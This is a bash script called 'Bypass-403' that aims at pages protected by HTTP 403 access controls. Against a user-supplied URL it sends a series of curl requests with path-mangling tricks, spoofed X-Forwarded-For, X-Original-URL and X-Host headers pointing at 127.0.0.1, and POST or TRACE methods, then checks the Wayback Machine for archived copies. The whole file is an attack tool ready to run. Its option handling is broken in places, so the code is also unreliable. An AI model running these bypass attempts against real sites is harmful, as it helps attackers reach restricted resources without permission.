#! /bin/bash


# Check if --header is provided
if [[ $3 == "--header" ]]; then
    HEADER="-H 'Header-Name: $3'"
else
    HEADER=""
fi
# Check if --proxy is provided
if [[ $4 == "--proxy" ]]; then
    PROXY="--proxy $4'"
else
    PROXY=""
fi

#! /bin/bash
figlet Bypass-403
echo "                                               By Iam_J0ker & only REFINED BY eng4ge"
echo "./bypass-403.sh https://example.com path [--header]"
echo " "
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $HEADER $PROXY $1/$2
echo "  --> ${1}/${2}"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $HEADER $PROXY $1/%2e/$2
echo "  --> ${1}/%2e/${2}"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $HEADER $PROXY $1/$2/.
echo "  --> ${1}/${2}/."
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $HEADER $PROXY $1//$2//
echo "  --> ${1}//${2}//"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $HEADER $PROXY $1/./$2/./
echo "  --> ${1}/./${2}/./"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $HEADER $PROXY -H "X-Original-URL: $2" $1/$2
echo "  --> ${1}/${2} -H X-Original-URL: ${2}"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $HEADER $PROXY -H "X-Custom-IP-Authorization: 127.0.0.1" $1/$2
echo "  --> ${1}/${2} -H X-Custom-IP-Authorization: 127.0.0.1"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $HEADER $PROXY -H "X-Forwarded-For: http://127.0.0.1" $1/$2
echo "  --> ${1}/${2} -H X-Forwarded-For: http://127.0.0.1"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $HEADER $PROXY -H "X-Forwarded-For: 127.0.0.1:80" $1/$2
echo "  --> ${1}/${2} -H X-Forwarded-For: 127.0.0.1:80"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $HEADER $PROXY -H "X-rewrite-url: $2" $1
echo "  --> ${1} -H X-rewrite-url: ${2}"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $HEADER $PROXY $1/$2%20
echo "  --> ${1}/${2}%20"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $HEADER $PROXY $1/$2%09
echo "  --> ${1}/${2}%09"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $HEADER $PROXY $1/$2?
echo "  --> ${1}/${2}?"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $HEADER $PROXY $1/$2.html
echo "  --> ${1}/${2}.html"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $HEADER $PROXY $1/$2/?anything
echo "  --> ${1}/${2}/?anything"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $HEADER $PROXY $1/$2#
echo "  --> ${1}/${2}#"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $HEADER $PROXY -H "Content-Length:0" -X POST $1/$2
echo "  --> ${1}/${2} -H Content-Length:0 -X POST"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $HEADER $PROXY $1/$2/*
echo "  --> ${1}/${2}/*"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $HEADER $PROXY $1/$2.php
echo "  --> ${1}/${2}.php"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $HEADER $PROXY $1/$2.json
echo "  --> ${1}/${2}.json"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $HEADER $PROXY -X TRACE $1/$2
echo "  --> ${1}/${2}  -X TRACE"
curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $HEADER $PROXY -H "X-Host: 127.0.0.1" $1/$2
echo "  --> ${1}/${2} -H X-Host: 127.0.0.1"
curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $HEADER $PROXY "$1/$2..;/"
echo "  --> ${1}/${2}..;/"
curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $HEADER $PROXY " $1/$2;/"
echo "  --> ${1}/${2};/"
#updated
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $HEADER $PROXY-X TRACE $1/$2
echo "  --> ${1}/${2} -X TRACE"
curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $HEADER $PROXY -H "X-Forwarded-Host: 127.0.0.1" $1/$2
echo "  --> ${1}/${2} -H X-Forwarded-Host: 127.0.0.1"
echo "Way back machine:"
curl -s  https://archive.org/wayback/available?url=$1/$2 $HEADER $PROXY | jq -r '.archived_snapshots.closest | {available, url}'

